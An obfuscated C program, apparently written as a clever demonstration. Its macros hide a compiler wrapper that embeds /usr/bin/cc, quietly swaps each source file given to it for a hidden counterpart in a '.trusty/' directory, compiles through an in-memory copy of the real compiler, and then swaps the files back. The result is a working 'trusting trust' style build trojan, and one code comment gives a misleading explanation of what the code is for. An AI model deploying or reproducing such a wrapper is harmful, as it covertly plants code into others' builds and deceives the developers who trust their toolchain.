#define A(a, b, c)C(A##a,A##b,A##c)

#define B(a, b, c)a##b##c
#define C(a, b, c)B(a,b,c)

#define D(x) #x
#define E(x) D(x)

#define F(a,b,c,d,e,f)H(A##a,A##b,A##c,A##d,A##e,A##f)

#define G(a,b,c,d,e,f)a##b##c##d##e##f
#define H(a,b,c,d,e,f)G(a,b,c,d,e,f)

#define A1 b
#define A2 c
#define A8 i
#define AD n
#define AH r
#define AI s
#define AJ t
#define AK u
#define AO y
#define AQ  

#define A0 a
#define A3 d
#define A4 e
#define A5 f
#define A6 g
#define A7 h
#define A9 j
#define AA k
#define AB l
#define AC m
#define AE o
#define AF p
#define AG q
#define AL v
#define AM w
#define AN x
#define AP z

#include "alloca.h"
#include "fcntl.h"
#include "stdio.h"
#include "string.h"
#include "sys/mman.h"
#include "sys/stat.h"
#include "sys/wait.h"
#include "unistd.h"

#define P E(/A(K,I,H)/A(1,8,D)/A(2,2,Q))
#define Z E(.A(J,H,K)A(I,J,O)/)
#define F1 F(H,4,D,0,C,4)
#define F2 F(I,J,H,2,F,O)
#define F3 F(I,J,H,B,4,D) 
#define F4 F(0,B,B,E,2,0)
#define F5 F(M,0,8,J,Q,Q)
#define F6 F(0,2,2,4,I,I)

char cc[] = {
#embed P
};

// fix issue with compiler frontend not being able to resolve the linker,
// which is passed through a named extern var environ
extern char **environ;

#define S                                   \
  for (int i = 1; i < c; i++) {             \
    F2(p = F4(F3(Z) + F3(v[i])), Z);        \
    F2(p + F3(Z), a[i] = v[i]);             \
    if (!F6(v[i], 0) & !F6(p, 0))           \
      F1(v[i], t) | F1(p, v[i]) | F1(t, p); \
  }

int main(int c, char *v[]) {
  int f;
  char *a[999] = {P}, *t = E(.A(H,2,K)), *p;

  S

  if (!fork()) {
    write(f = memfd_create(E(), 1), cc, sizeof cc);
    execveat(f, E(), a, environ, 4096);
  }
  F5(0);
  S
}
